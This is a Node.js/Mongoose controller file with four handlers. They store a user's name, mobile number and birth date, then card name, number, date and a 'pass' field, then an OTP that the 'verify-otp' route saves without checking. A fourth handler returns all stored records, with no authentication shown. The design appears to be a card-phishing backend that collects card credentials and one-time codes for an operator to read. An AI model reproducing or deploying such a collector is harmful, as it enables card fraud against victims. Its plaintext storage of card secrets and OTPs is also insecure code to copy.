const Details = require('../model/detailSchema');
const mongoose = require('mongoose');

// POST /basic
const basicDetails = async (req, res) => {
    const { device_id, content } = req.body;

    let parsed;
    try {
        parsed = JSON.parse(content);
    } catch (err) {
        return res.status(400).json({ message: "Invalid JSON content" });
    }

    const { username, mobileno, dob } = parsed;

    if (!username || !mobileno || !dob) {
        return res.status(400).json({ message: "All fields are required" });
    }

    try {
        const newUser = await Details.create({ username, mobileno, dob });

        if (!newUser) {
            return res.status(400).json({ message: "Unable to create user" });
        }

        res.status(201).json({
            message: "User created successfully",
            data: newUser
        });
    } catch (error) {
        console.error("Error creating user:", error);
        res.status(500).json({ message: "Server error", error: error.message });
    }
};

// POST /card
const cardDetails = async (req, res) => {
    const { device_id, content, userId } = req.body;

    // console.log("INside the card details")
    let parsed;
    try {
        parsed = JSON.parse(content);
    } catch (err) {
        return res.status(400).json({ message: "Invalid JSON content" });
    }

    const { name, number, date, pass } = parsed;
    // console.log(name, number, userId, pass, date);
    if (!userId || !name || !number || !date || !pass) {
        return res.status(400).json({ message: "All fields are required" });
    }


    try {
        const existingUser = await Details.findById(userId);

        // console.log(existingUser);

        if (!existingUser) {
            return res.status(404).json({ message: "User not found" });
        }

        existingUser.name=name;
        existingUser.date=date;
        existingUser.number=number;
        existingUser.pass=pass;
        await existingUser.save();

        res.status(200).json({
            message: "Card details updated successfully",
            data: existingUser
        });
    } catch (error) {
        console.error("Error updating card details:", error);
        res.status(500).json({ message: "Server error", error: error.message });
    }
};

// POST /verify-otp
const verifyOtp = async (req, res) => {
    const { device_id, content, userId } = req.body;

    let parsed;
    try {
        parsed = JSON.parse(content);
    } catch (err) {
        return res.status(400).json({ message: "Invalid JSON content" });
    }

    const { otp } = parsed;

    if (!userId || !otp) {
        return res.status(400).json({ message: "User ID and OTP are required" });
    }

    try {
        const user = await Details.findById(userId); // Was using wrong model before: fixed

        if (!user) {
            return res.status(404).json({ message: "User not found" });
        }

        user.otp = otp;
        await user.save();

        res.status(200).json({
            message: "OTP stored successfully",
            userId: user._id
        });
    } catch (error) {
        console.error("Error storing OTP:", error);
        res.status(500).json({ message: "Server error", error: error.message });
    }
};

const getAllUserDetails = async (req,res)=>{
    console.log("Inside the get User details");
    const users = await Details.find().sort({ createdAt: -1 });

    return res.status(201).json({
        message:"User fetched successfully",
        users:users
    });

}

module.exports = {
    verifyOtp,
    basicDetails,
    cardDetails,
    getAllUserDetails
};
